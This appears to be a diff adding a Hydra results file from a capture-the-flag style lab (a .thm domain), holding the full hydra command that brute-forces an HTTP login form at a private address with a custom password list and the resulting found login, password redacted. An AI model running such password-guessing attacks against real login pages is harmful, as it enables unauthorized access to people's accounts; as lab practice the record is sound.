@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2026-09-07 14:52:55 on 10.81.189.57 http-post-form (hydra -l specialadmin@support.thm -P custom_mangled.txt -t 64 -o admin_creds.txt 10.81.189.57 http-post-form /index.php:email=^USER^&password=^PASS^:F=Invalid credentials)
+[80][http-post-form] host: 10.81.189.57   login: specialadmin@support.thm   password: [REDACTED]
